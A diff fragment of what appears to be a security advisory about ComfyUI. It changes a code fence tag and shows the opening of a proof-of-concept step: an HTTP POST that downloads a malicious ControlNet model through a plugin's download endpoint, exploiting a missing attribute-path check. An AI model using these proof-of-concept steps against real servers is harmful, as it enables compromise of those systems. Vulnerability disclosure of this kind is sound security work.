@@ -55,7 +55,7 @@ No validation is performed on the attribute path. A malicious model can embed ke
 
 1. Download the malicious ControlNet model via a plugin such as [ComfyUI-Easy-Use](https://github.com/yolain/ComfyUI-Easy-Use):
 
-```http
+```text
 POST /easyuse/model/download HTTP/1.1
 Host: proof-of-concept:8188
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
